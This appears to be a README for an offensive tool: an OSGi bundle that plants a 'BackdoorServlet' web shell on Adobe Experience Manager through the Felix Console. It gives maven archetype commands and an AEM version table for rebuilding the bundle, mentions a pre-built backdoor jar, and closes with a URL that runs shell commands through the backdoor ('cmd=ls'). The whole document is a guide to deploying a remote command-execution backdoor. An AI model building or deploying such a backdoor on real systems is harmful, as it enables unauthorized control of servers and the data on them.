# AEM RCE OSGI bundle

OSGI bundle allows to get RCE when you have access to Felix Console. There is pre-build bundle `rce.bundle.core-1.0-SNAPSHOT.jar`, works for AEM 6.2 or newer.

### Build by yourself

Generate new skeleton as described below. Backport `BackdoorServlet` to newly genearted skeleton and build it with maven.

For AEM 5.6 use following maven command.

```
mvn org.apache.maven.plugins:maven-archetype-plugin:2.4:generate \
 -DarchetypeGroupId=com.day.jcr.vault \
 -DarchetypeArtifactId=multimodule-content-package-archetype \
 -DarchetypeVersion=1.0.2 \
 -DarchetypeCatalog=https://repo.adobe.com/nexus/content/groups/public/

```

For AEM 6.0 or newer use following maven command.

```
mvn org.apache.maven.plugins:maven-archetype-plugin:2.4:generate \
 -DarchetypeGroupId=com.adobe.granite.archetypes \
 -DarchetypeArtifactId=aem-project-archetype \
 -DarchetypeVersion=SELECT_FROM_TABLE \
 -DarchetypeCatalog=https://repo.adobe.com/nexus/content/groups/public/

```

Select archetype version from the table.

<table>
  <tr>
    <th>Archetype version </th>
    <th>AEM version</th>
  </tr>
  <tr>
    <td>7</td>
    <td>6.0 or newer</td>
  </tr>
  <tr>
    <td>8</td>
    <td>6.0 or newer</td>
  </tr>
  <tr>
    <td>9</td>
    <td>6.0 or newer</td>
  </tr>
  <tr>
    <td>10</td>
    <td>6.0 or newer</td>
  </tr>
  <tr>
    <td>11</td>
    <td>6.2 or newer</td>
  </tr>
  <tr>
    <td>12</td>
    <td>6.3 or newer</td>
  </tr>
  <tr>
    <td>13</td>
    <td>6.4, 6.3 + SP2</td>
  </tr>
  <tr>
    <td>14</td>
    <td>6.4, 6.3 + SP2</td>
  </tr>
</table>

### Access the shell
https://aem.webapp/bin/backdoor.html?cmd=ls

